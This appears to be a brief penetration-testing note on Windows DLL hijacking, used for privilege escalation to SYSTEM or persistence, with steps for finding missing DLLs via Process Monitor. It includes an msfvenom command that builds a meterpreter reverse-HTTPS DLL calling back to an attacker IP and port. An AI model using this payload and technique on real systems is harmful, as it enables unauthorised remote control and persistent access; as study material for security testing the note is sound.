# DLL Hijacking/Preloading

This technique can be used for either PriEsc (<ins>from local admin to system></ins>) or Persistence. If you're not an admin, you might have trouble starting ot stopping the service, but can rely on reboot for services that auto start. 

The idea is that when a program launches, it may look for certain dll and not found it in the first place of search, in which case you'll see `NAME NOT FOUND` in the process monitor. The program then go down the [DLL search order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order) to look for the DLL. We can use this to our advantage by placing a malicious DLL in the place where the program first searched but did not find the DLL. 

Payload example: 
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.10.3 LPORT=4444 -f dll > payload64.dll
```

To use it for PriEsc to SYSTEM, you'll need to identify a service that runs on SYSTEM privilege. To do this, Run **process explorer** as the local admin, right click on the column to add "User Name" to the columns.  



#### Tool:  
* process explorer - to identify service privilege, as well as to start/stop the service
* process monitor - to identify what dll is not found in the first search place and where to put the payload dll



